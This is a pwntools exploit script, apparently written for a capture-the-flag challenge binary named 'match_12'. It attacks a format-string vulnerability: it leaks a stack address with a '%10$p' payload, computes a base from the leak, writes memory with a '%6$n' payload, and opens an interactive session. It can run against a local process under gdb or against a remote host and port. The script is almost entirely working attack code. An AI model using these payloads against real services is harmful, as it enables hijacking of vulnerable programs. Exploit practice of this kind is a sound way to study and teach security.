#!/usr/bin/env python
from pwn import *
import sys
from libformatstr import FormatStr

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
#gdb_bool = False

win = 0x897


#local name addr : 0x56557070
#read in 0x1f

'''
edit name:
Guessed arguments:
arg[0]: 0x0
arg[1]: 0x56557070 --> 0xa31 (1\n)
arg[2]: 0x1f
'''



'''
prep message after an edit
Guessed arguments:
arg[0]: 0x56557040 --> 0x0
arg[1]: 0x56555b7b --> 0xa9929ff0
arg[2]: 0x56557070 ("BB\n", 'A' <repeats 12 times>, "\n")

'''

def edit(name):
    r.sendlineafter("> ","1")
    r.sendafter("Name: ",name)

def prep():
    r.sendlineafter("> ","1448439810")

def printmessage():
    r.sendlineafter("> ","y")

def exploit(r):
    #d=FormatStr()
    #one_gadget = libc_base+0x45390
    #d[0x601020] = one_gadget

    #r.sendline(d.payload(6, start_len=0))
    name = "A" *0x1f
    r.sendafter("Name: ",name)

    
    buf = "b" * (0x1f - 6) + "%10$p"
    edit(buf)
    
    prep()

    leak  = r.recvuntil("A",drop = True)
    log.info("Leak %s"%(leak))
    leak_addr = eval(leak) - 56
    log.info("Base %s"%hex(leak_addr))
    #d=FormatStr()
    #test = 0x454545
    #d[0x601020] = one_gadget
    #11
    #43
    

    buf = "R" * (0x1f - 6) + "AA%6$n"
    edit(buf)
    prep()

    #win = 9FD
    
    r.sendlineafter("> ","-14983")
    
    
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./match_12"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x5655592F",
            "b *0x565558fc",
            "c"


        ]

        '''
                gdb_cmd = [
            "watch *0x56555b7b",
            "b *0x565559b1",
            "b *0x565558f2",
            "b *0x565558fc",
            "b *0x56555A6A",
            "b *0x56555996",
            "b *0x565559BB",
            "b *0x565559CF",
            "b *0x56555969",
            "c"


        ]'''
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

